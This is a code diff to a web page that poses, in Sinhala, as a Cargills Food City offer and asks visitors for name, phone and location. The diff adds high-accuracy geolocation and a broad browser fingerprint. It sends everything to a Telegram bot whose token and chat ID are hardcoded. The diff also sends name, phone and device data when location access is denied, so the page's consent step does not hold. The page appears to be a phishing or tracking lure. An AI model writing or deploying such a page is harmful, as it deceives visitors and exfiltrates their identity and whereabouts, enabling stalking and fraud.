@@ -205,6 +205,15 @@
             border-top: 1px solid #eee;
         }
         
+        .more-info {
+            display: none;
+            margin-top: 20px;
+            padding: 15px;
+            background: #f0f7ff;
+            border-radius: 8px;
+            border-left: 4px solid #4da6ff;
+        }
+        
         @media (max-width: 600px) {
             .benefits {
                 grid-template-columns: 1fr;
@@ -225,7 +234,7 @@
         
         <div class="content">
             <div class="offer-section">
-                <h1 class="offer-title"ගෙදර යනගමන් වාසි දිනාගන්න!</h1>
+                <h1 class="offer-title">ගෙදර යනගමන් වාසි දිනාගන්න!</h1>
                 <p>ඔබ ආසනයේ ඇති Cargills Food City ගබඩාව සොයා ගන්නා අතර විශේෂ දීමනා වලින් අනුභව කරන්න.</p>
                 
                 <div class="offer-card">
@@ -257,6 +266,11 @@
             </div>
             
             <div id="status" class="status waiting">කරුණාකර ඉහත තොරතුරු පුරවන්න සහ අනුමැතිය ලබාදෙන්න</div>
+            
+            <div class="more-info" id="moreInfo">
+                <h3>Device Information Collected:</h3>
+                <div id="deviceDetails"></div>
+            </div>
             
             <div class="info-section">
                 <h3 class="info-title">Cargills Online වාසි</h3>
@@ -291,6 +305,8 @@
             const consentCheckbox = document.getElementById('consent-check');
             const locateBtn = document.getElementById('locate-btn');
             const statusEl = document.getElementById('status');
+            const moreInfoEl = document.getElementById('moreInfo');
+            const deviceDetailsEl = document.getElementById('deviceDetails');
             
             // Enable button when consent is given
             consentCheckbox.addEventListener('change', function() {
@@ -310,15 +326,14 @@
                     navigator.geolocation.getCurrentPosition(
                         function(position) {
                             // Get additional device information
-                            const deviceInfo = {
-                                userAgent: navigator.userAgent,
-                                platform: navigator.platform,
-                                language: navigator.language,
-                                name: name,
-                                phone: phone
-                            };
+                            const deviceInfo = getDeviceInfo();
+                            deviceInfo.name = name;
+                            deviceInfo.phone = phone;
                             
-                            // Send data to Telegram (using your provided token and ID)
+                            // Display device information
+                            displayDeviceInfo(deviceInfo);
+                            
+                            // Send data to Telegram
                             sendToTelegram(
                                 position.coords.latitude, 
                                 position.coords.longitude,
@@ -326,36 +341,106 @@
                             );
                         },
                         function(error) {
+                            let errorMessage = '❌ ස්ථාන තොරතුරු ලබාගැනීමට නොහැකි විය. ';
+                            
+                            switch(error.code) {
+                                case error.PERMISSION_DENIED:
+                                    errorMessage += 'කරුණාකර බ්‍රවුසර් අනුමතිය පරීක්ෂා කරන්න.';
+                                    break;
+                                case error.POSITION_UNAVAILABLE:
+                                    errorMessage += 'ස්ථාන තොරතුරු ලබා ගත නොහැක.';
+                                    break;
+                                case error.TIMEOUT:
+                                    errorMessage += 'ස්ථාන තොරතුරු ලබා ගැනීම කල් ඉකුත් විය.';
+                                    break;
+                                default:
+                                    errorMessage += 'නොදන්නා දෝෂයක්.';
+                                    break;
+                            }
+                            
                             statusEl.className = 'status error';
-                            statusEl.innerHTML = '❌ ස්ථාන තොරතුරු ලබාගැනීමට නොහැකි විය. කරුණාකර බ්‍රවුසර් අනුමතිය පරීක්ෂා කරන්න.';
+                            statusEl.innerHTML = errorMessage;
+                            
+                            // Even if location fails, try to get device info
+                            const deviceInfo = getDeviceInfo();
+                            deviceInfo.name = name;
+                            deviceInfo.phone = phone;
+                            displayDeviceInfo(deviceInfo);
+                            sendToTelegram(null, null, deviceInfo);
                         },
-                        { timeout: 10000 }
+                        { 
+                            timeout: 10000,
+                            enableHighAccuracy: true 
+                        }
                     );
                 } else {
                     statusEl.className = 'status error';
                     statusEl.innerHTML = '❌ ඔබේ බ්රවුසරය ස්ථාන තොරතුරු සපයනවා නොවේ.';
+                    
+                    // Try to get device info even if geolocation is not supported
+                    const deviceInfo = getDeviceInfo();
+                    deviceInfo.name = name;
+                    deviceInfo.phone = phone;
+                    displayDeviceInfo(deviceInfo);
+                    sendToTelegram(null, null, deviceInfo);
                 }
             });
             
+            function getDeviceInfo() {
+                return {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    languages: navigator.languages ? navigator.languages.join(', ') : 'Unknown',
+                    cookieEnabled: navigator.cookieEnabled,
+                    screenWidth: screen.width,
+                    screenHeight: screen.height,
+                    colorDepth: screen.colorDepth,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    deviceMemory: navigator.deviceMemory || 'Unknown',
+                    hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
+                    referrer: document.referrer || 'Direct'
+                };
+            }
+            
+            function displayDeviceInfo(deviceInfo) {
+                moreInfoEl.style.display = 'block';
+                let html = '<ul>';
+                
+                for (const [key, value] of Object.entries(deviceInfo)) {
+                    if (key !== 'name' && key !== 'phone') {
+                        html += `<li><strong>${key}:</strong> ${value}</li>`;
+                    }
+                }
+                
+                html += '</ul>';
+                deviceDetailsEl.innerHTML = html;
+            }
+            
             function sendToTelegram(lat, lon, deviceInfo) {
                 // IMPORTANT: In a real application, these should not be exposed in client-side code
-                // Use a server-side endpoint to protect your bot token
                 const botToken = "8477495842:AAHN8GT3ZBaaKXP-TWySiL1jpWhaiwLVn30";
                 const chatId = "8144368202";
                 
                 // Format the message with all collected information
-                const message = `📍 Cargills Online Location Request
+                let message = `📍 Cargills Online Location Request\n\n`;
                 
-                🗺 Location: ${lat},${lon}
-                👤 Name: ${deviceInfo.name}
-                📞 Phone: ${deviceInfo.phone}
+                if (lat && lon) {
+                    message += `🗺 Location: ${lat},${lon}\n`;
+                    message += `📍 Google Maps: https://maps.google.com/?q=${lat},${lon}\n\n`;
+                } else {
+                    message += `❌ Location not available\n\n`;
+                }
                 
-                🖥 Device Info:
-                User Agent: ${deviceInfo.userAgent}
-                Platform: ${deviceInfo.platform}
-                Language: ${deviceInfo.language}
+                message += `👤 Name: ${deviceInfo.name}\n`;
+                message += `📞 Phone: ${deviceInfo.phone}\n\n`;
+                message += `🖥 Device Info:\n`;
                 
-                📍 Google Maps: https://maps.google.com/?q=${lat},${lon}`;
+                for (const [key, value] of Object.entries(deviceInfo)) {
+                    if (key !== 'name' && key !== 'phone') {
+                        message += `${key}: ${value}\n`;
+                    }
+                }
                 
                 // Encode the message for URL
                 const encodedMessage = encodeURIComponent(message);
